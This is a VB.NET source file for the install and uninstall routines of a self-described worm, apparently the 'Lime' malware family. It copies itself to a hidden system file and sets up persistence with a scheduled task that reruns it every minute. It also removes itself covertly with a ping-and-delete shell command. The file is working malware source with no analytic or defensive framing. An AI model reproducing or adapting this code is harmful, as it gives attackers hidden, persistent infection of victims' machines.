Public Class Installation

    Public Shared Sub INS()

        'Install worm on PC
        'Using schtasks instead of reg and startup folder

        If Settings.DROP AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> Settings.fullpath Then 'Checking if worm is already installed

            'Worm not installed// begein installing
            Try
                If Not IO.Directory.Exists(Environ(Settings.PATH1) & "\" & Settings.PATH2) Then 'Checking and creating FOLDER PATH1 PATH2
                    IO.Directory.CreateDirectory(Environ(Settings.PATH1) & "\" & Settings.PATH2)
                ElseIf IO.File.Exists(Settings.fullpath) Then 'If somehow filename exists, instead of duplicate , I will delete it and replace it with worm
                    IO.File.Delete(Settings.fullpath)
                End If

                Dim NF As New IO.FileStream((Settings.fullpath), IO.FileMode.CreateNew) 'Installing worm using FS instead of io.file.copy
                Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(Settings.NEXE.FullName)
                NF.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                NF.Flush()
                NF.Close()
                Settings.NEXE = New IO.FileInfo(Settings.fullpath) 'NEXE = Worm location

                IO.File.SetAttributes(Settings.NEXE.FullName, IO.FileAttributes.System + IO.FileAttributes.Hidden) 'Hide worm

                Shell("schtasks /create /f /sc minute /mo 1 /tn Lime_0.4 /tr " & Settings.NEXE.FullName & "", AppWinStyle.Hide, False, -1) 'persistence

                Process.Start(Settings.NEXE.FullName) 'Start worm from NEXE location
                End ' Close this application because NEXE will be started
            Catch ex As Exception
            End Try
        End If
    End Sub

    Public Shared Sub DEL()
        'Uninstall worm from PC

        Try
            If Settings.DROP Then
                IO.File.SetAttributes(Settings.NEXE.FullName, IO.FileAttributes.Normal) 'un-hide
                Threading.Thread.Sleep(50)

                Shell("schtasks /Delete /tn Lime_0.4 /F", AppWinStyle.Hide, False, -1) 'delete persistence
                Threading.Thread.Sleep(50)
            End If

            Shell("cmd.exe /c ping 0 -n 2 & del """ & Settings.NEXE.FullName & """", AppWinStyle.Hide, False, -1) 'Delete NEXE
            End
        Catch ex As Exception
        End Try
    End Sub

End Class